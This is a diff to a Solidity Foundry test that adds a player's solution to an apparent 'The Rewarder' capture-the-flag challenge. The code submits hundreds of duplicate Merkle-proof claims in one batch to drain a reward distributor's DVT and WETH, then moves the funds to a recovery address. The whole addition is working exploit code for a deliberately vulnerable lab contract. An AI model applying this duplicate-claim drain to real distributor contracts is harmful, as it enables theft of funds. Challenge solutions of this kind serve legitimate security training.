@@ -145,10 +145,55 @@ contract TheRewarderChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * CODE YOUR SOLUTION HER 
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        uint PLAYER_DVT_CLAIM = 11524763827831882;
+        uint PLAYER_WETH_CLAIM = 1171088749244340;
+
+        console.log("Player Address: ", address(player));
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        uint dvtTransactionCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM;
+        uint wethTransactionCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM;
+
+        uint totalTransactionCount = dvtTransactionCount + wethTransactionCount;
+
+        IERC20[] memory tokensClaim = new IERC20[](2);
+
+        tokensClaim[0] = IERC20(address(dvt));
+        tokensClaim[1] = IERC20(address(weth));
+
+        Claim[] memory allClaims = new Claim[](totalTransactionCount);
+
+        for(uint i = 0; i < totalTransactionCount; i++) {
+            if (i < dvtTransactionCount){
+                allClaims[i] = Claim({
+                    batchNumber: 0,
+                    amount: PLAYER_DVT_CLAIM,
+                    tokenIndex: 0,
+                    proof: merkle.getProof(dvtLeaves, 188)
+                });
+            } else {
+                allClaims[i] = Claim({
+                    batchNumber: 0,
+                    amount: PLAYER_WETH_CLAIM,
+                    tokenIndex: 1,
+                    proof: merkle.getProof(wethLeaves, 188)
+                });
+            }
+        }
+
+        distributor.claimRewards({
+            inputClaims: allClaims,
+            inputTokens: tokensClaim
+        });
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+
     }
 
     /**
